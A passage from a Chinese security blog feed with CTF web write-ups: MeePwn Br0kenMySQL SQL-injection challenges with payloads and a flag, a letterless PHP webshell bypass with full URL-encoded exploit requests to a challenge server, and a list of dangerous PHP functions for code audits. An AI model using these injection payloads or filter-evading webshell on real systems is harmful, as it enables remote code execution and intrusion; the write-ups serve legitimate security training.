<h1 id="Br0kenMySQL-v2"><a href="#Br0kenMySQL-v2" class="headerlink" title="Br0kenMySQL v2"></a>Br0kenMySQL v2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">Br0kenMySQL</div><div class="line">&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;</div><div class="line">&lt;p style=<span class="string">'color:Red'</span>&gt;Br0kenMySQL&lt;/p&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>]==<span class="string">'🕵'</span>) <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</div><div class="line"><span class="keyword">require</span> <span class="string">'../config.php'</span>;</div><div class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, MYSQL_USER, MYSQL_PASSWORD);</div><div class="line"><span class="keyword">if</span> (!$link) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!mysqli_select_db($link,MYSQL_USER)) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not select database: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">    $id = $_GET[<span class="string">'id'</span>];</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count|select|from|\(|\)#is'</span>,$id))</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</div><div class="line">    $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</div><div class="line">    $row = mysqli_fetch_array($query);</div><div class="line">    $username = $row[<span class="string">'username'</span>];</div><div class="line">    <span class="keyword">if</span>($username === <span class="string">'guest'</span>)&#123;</div><div class="line">        $ip = @$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]!=<span class="string">""</span> ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count|select|from|\(|\)#is'</span>,$ip))</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</div><div class="line">        var_dump($ip);</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($ip))</div><div class="line">            mysqli_query($link,<span class="string">"INSERT INTO logs VALUES('&#123;$ip&#125;')"</span>);</div><div class="line">        $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</div><div class="line">        $row = mysqli_fetch_array($query);</div><div class="line">        $username = $row[<span class="string">'username'</span>];</div><div class="line">        <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"What, again ???????!@#$!@#$!@#$\n"</span>;</div><div class="line">            <span class="keyword">die</span>(FLAG_2);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Nothing here"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Hello "</span>.$username;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/h1&gt;</div><div class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
<p>相比较于第一题，过滤了select，和括号（），所以需要换其他方法。类似前面，需要找到一个随机的方法，使得id的值在某些情况下为1（admin），为2（guest），并且不需要括号。比如对一个“随机”值，对其进行mod 2，得到的结果是0或1，我们只要再加上1，就能得到对应的1或2。<br>几种payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 + CURRENT_TIMESTAMP%2</div><div class="line">1 + localtime%2</div><div class="line">1 + localtimestamp%2</div><div class="line">1 + utc_timestamp%2</div></pre></td></tr></table></figure></p>
<p>当然在发送的时候要进行url编码，+替换为%2b,%替换为%25</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MeePwnCTF&#123;_I_g1ve__uPPPPPPPP&#125;</div></pre></td></tr></table></figure>
<h1 id="Br0kenMySQL-v3"><a href="#Br0kenMySQL-v3" class="headerlink" title="Br0kenMySQL v3"></a>Br0kenMySQL v3</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">Br0kenMySQL</div><div class="line">&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;</div><div class="line">&lt;p style=&apos;color:Red&apos;&gt;Br0kenMySQL&lt;/p&gt;</div><div class="line">&lt;?php</div><div class="line"></div><div class="line">if($_GET[&apos;debug&apos;]==&apos;🕵&apos;) die(highlight_file(__FILE__));</div><div class="line"></div><div class="line">require &apos;../config.php&apos;;</div><div class="line"></div><div class="line">$link = mysqli_connect(&apos;localhost&apos;, MYSQL_USER, MYSQL_PASSWORD);</div><div class="line"></div><div class="line">if (!$link) &#123;</div><div class="line">    die(&apos;Could not connect: &apos; . mysql_error());</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (!mysqli_select_db($link,MYSQL_USER)) &#123;</div><div class="line">    die(&apos;Could not select database: &apos; . mysql_error());</div><div class="line">&#125;</div><div class="line">    $id = $_GET[&apos;id&apos;];</div><div class="line">    if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$id))</div><div class="line">        die(&apos;Don\&apos;t hurt me :-(&apos;);</div><div class="line">    $query = mysqli_query($link,&quot;SELECT username FROM users WHERE id = &quot;. $id);</div><div class="line">    $row = mysqli_fetch_array($query);</div><div class="line">    $username = $row[&apos;username&apos;];</div><div class="line"></div><div class="line">    if($username === &apos;guest&apos;)&#123;</div><div class="line">        sleep(5); // wait</div><div class="line">        $ip = @$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]!=&quot;&quot; ? $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] : $_SERVER[&apos;REMOTE_ADDR&apos;];</div><div class="line">        if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$ip))</div><div class="line">            die(&apos;Don\&apos;t hurt me :-(&apos;);</div><div class="line">        var_dump($ip);</div><div class="line">        if(!empty($ip))</div><div class="line">            mysqli_query($link,&quot;INSERT INTO logs VALUES(&apos;&#123;$ip&#125;&apos;)&quot;);</div><div class="line"></div><div class="line">        $query = mysqli_query($link,&quot;SELECT username FROM users WHERE id = &quot;. $id);</div><div class="line">        $row = mysqli_fetch_array($query);</div><div class="line">        $username = $row[&apos;username&apos;];</div><div class="line">        if($username === &apos;admin&apos;)&#123;</div><div class="line">            echo &quot;What, again ???????!@#$!@#$!@#$\n&quot;;</div><div class="line">            echo &quot;Last one, promise!\n&quot;;</div><div class="line">            die(FLAG_3);</div><div class="line">        &#125;</div><div class="line">        echo &quot;Nothing here&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">        echo &quot;Hello &quot;.$username;</div><div class="line">    &#125;</div><div class="line">?&gt;</div><div class="line">&lt;/h1&gt;</div><div class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;考点：反序列化，rand，sql注入&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>谈一谈php变量的内存分布</title>
    <link href="http://yoursite.com/2017/07/16/%E8%B0%88%E4%B8%80%E8%B0%88php%E5%8F%98%E9%87%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83/"/>
    <id>http://yoursite.com/2017/07/16/谈一谈php变量的内存分布/</id>
    <published>2017-07-15T17:02:45.000Z</published>
    <updated>2017-07-26T10:48:38.822Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>一道好玩的webshell题</title>
    <link href="http://yoursite.com/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/"/>
    <id>http://yoursite.com/2017/07/15/一道好玩的webshell题/</id>
    <published>2017-07-15T12:38:28.000Z</published>
    <updated>2017-07-26T10:56:57.228Z</updated>
    
    <content type="html"><![CDATA[<p>过滤了数字和绝大多数字符。<br><a id="more"></a><br>题目给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">ini_set(<span class="string">"display_errors"</span>, <span class="string">"On"</span>);</div><div class="line">error_reporting(E_ALL | E_STRICT);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</div><div class="line">   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">   <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_string</span><span class="params">( $length )</span> </span>&#123;</div><div class="line">   $chars = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;    </div><div class="line">   $size = strlen( $chars );</div><div class="line">   $str = <span class="string">''</span>;</div><div class="line">   <span class="keyword">for</span>( $i = <span class="number">0</span>; $i &lt; $length; $id+ ) &#123;</div><div class="line">	   $str .= $chars[ rand( <span class="number">0</span>, $size - <span class="number">1</span> ) ];</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$data = $_GET[<span class="string">'c'</span>];</div><div class="line"></div><div class="line">$black_list = <span class="keyword">array</span>(<span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>, <span class="string">'*'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'\\'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'|'</span>, <span class="string">'~'</span>);</div><div class="line"><span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $b) &#123;</div><div class="line">   <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</div><div class="line">	   <span class="keyword">die</span>(<span class="string">"WAF!"</span>);</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line">$filename=rand_string(<span class="number">0x20</span>).<span class="string">'.php'</span>;</div><div class="line"></div><div class="line">$folder=<span class="string">'uploads/'</span>;</div><div class="line"></div><div class="line">$full_filename = $folder.$filename;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(file_put_contents($full_filename, <span class="string">'&lt;?php '</span>.$data))&#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"&lt;a href='"</span>.$full_filename.<span class="string">"'&gt;WebShell&lt;/a&gt;&lt;/br&gt;"</span>;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"Enjoy your webshell~"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"Some thing wrong..."</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>字母啥的都过略了。参考p神的<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4" target="_blank" rel="external">一些不包含数字和字母的webshell</a>。其思路就是利用字符串<code>ARRAY</code>获取字符<code>A</code>，利用php的特性，从<code>A</code>递增获得<code>A</code>到<code>Z</code>的各个字母。原webshell存在<code>&quot;</code>修改其webshell，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$_=<span class="string">''</span>;$_[+$_]++;</div><div class="line">$_=$_.<span class="string">''</span>;</div><div class="line">$__=$_[+<span class="string">''</span>];</div><div class="line">$_ = $__;</div><div class="line">$___=$_;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$___.=$__;</div><div class="line">$___.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;  </div><div class="line">$___.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$___.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$___.=$__;</div><div class="line">$____=<span class="string">'_'</span>;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$____.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$____.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$____.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$____.=$__;</div><div class="line">$_=$$____;</div><div class="line">$___($_[_]);</div></pre></td></tr></table></figure></p>
<p>由于<code>+</code>在传送中会被解释为空格，所以需要提前url编码为<code>%2b</code>,然后还需要去掉上面的这个webshell中的空格，换行。最后的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://120.24.215.80:10010/?c=$_=&apos;&apos;;$_[%2b$_]%2b%2b;$_=$_.&apos;&apos;;$__=$_[%2b&apos;&apos;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&apos;_&apos;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170715/1.jpg?raw=true" alt=""></p>
<p>这里另外补充一个webshell，解法来自<a href="http://www.jianshu.com/p/d23d4b1358f2" target="_blank" rel="external">http://www.jianshu.com/p/d23d4b1358f2</a>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_=[].[];</div><div class="line">$__=<span class="string">''</span>;</div><div class="line">$_=$_[<span class="string">''</span>];</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$__.=$_; <span class="comment">// E</span></div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$__=$_.$__; <span class="comment">// GE</span></div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$__.=$_; <span class="comment">// GET var_dump($&#123;'_'.$__&#125;[_]($&#123;'_'.$__&#125;[__])); // $_GET["_"]($_GET["__"]);</span></div></pre></td></tr></table></figure></p>
<p>其最后的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://120.24.215.80:10010/?c=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;过滤了数字和绝大多数字符。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="webshell" scheme="http://yoursite.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计小总结</title>
    <link href="http://yoursite.com/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2017/07/14/php代码审计小总结/</id>
    <published>2017-07-14T14:00:50.000Z</published>
    <updated>2017-07-14T14:26:19.987Z</updated>
    
    <content type="html"><![CDATA[<p>php代码审计小总结<br><a id="more"></a></p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h2><ul>
<li>eval()</li>
<li>assert()</li>
<li>preg_replace + ‘/e’</li>
<li>call_user_func()</li>
<li>call_user_func_arra()</li>
<li>create_function</li>
<li>array_map()</li>
</ul>
<h2 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h2><ul>
<li>system()</li>
<li>passthru()</li>
<li>exec()</li>
<li>pcntl_exec()</li>
<li>shell_exec()</li>
<li>popen()</li>
<li>proc_open()</li>
<li>`(反单引号)</li>
<li>ob_start()</li>
<li>escapeshellcmd() // 该函数用于过滤</li>
</ul>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ul>
<li>move_uploaded_file()</li>
<li>getimagesize() //验证文件头只要为GIF89a，就会返回真</li>
</ul>
<h1 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h1><ul>
<li>unlink()</li>
<li>session_destroy()</li>
</ul>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul>
<li>require()</li>
<li>include()</li>
<li>include_once()</li>
<li>require_once()</li>
</ul>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ul>
<li>allow_url_include = on</li>
</ul>
<h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><ul>
<li>hightlight_file($filename);</li>
<li>show_source($filename);</li>
<li>print_r(php_strip_whitespace($filename));</li>
<li>print_r(file_get_contents($filename));</li>
<li>readfile($filename);</li>
<li>print_r(file($filename)); // var_dump</li>
<li>fread(fopen($filename,”r”), $size);</li>
<li>include($filename); // 非php代码</li>
<li>include_once($filename); // 非php代码</li>
<li>require($filename); // 非php代码</li>
<li>require_once($filename); // 非php代码</li>
<li>print_r(fread(popen(“cat flag”, “r”), $size));</li>
<li>print_r(fgets(fopen($filename, “r”))); // 读取一行</li>
<li>fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF</li>
<li>print_r(fgetcsv(fopen($filename,”r”), $size));</li>
<li>print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记</li>
<li>print_r(fscanf(fopen(“flag”, “r”),”%s”));</li>
<li>print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</li>
</ul>
<h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><ul>
<li>print_r(glob(“*”)); // 列当前目录</li>
<li>print_r(glob(“/*”)); // 列根目录 print_r(scandir(“.”));</li>
<li>print_r(scandir(“/“));</li>
<li><code>$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d))){echo&quot;$f\n&quot;;}</code></li>
<li><code>$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read())){echo$f.&quot;\n&quot;;}</code></li>
</ul>
<h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h2><ul>
<li><a href="http://php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="external">$GLOBALS</a></li>
</ul>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul>
<li>extract()</li>
<li>import_request_variables()</li>
<li>parse_str()</li>
<li>mb_parse_str()</li>
<li>全局变量覆盖：register_globals为ON，$GLOBALS</li>
</ul>
